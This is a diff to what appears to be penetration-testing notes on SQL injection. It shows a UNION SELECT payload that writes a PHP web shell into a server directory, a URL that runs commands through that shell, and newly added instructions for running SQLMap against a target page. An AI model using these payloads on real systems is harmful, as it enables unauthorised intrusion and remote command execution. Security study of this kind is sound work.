@@ -220,3 +220,11 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 ```
 Then we can test, in our browser with `http://SERVER_IP:PORT/shell.php?0=id`.
 
+## SQLMap
+
+SQLMap is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.
+```
+python sqlmap.py -u 'http://$domain/page.php?id=5' --batch
+```
+*Note: the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.*
+
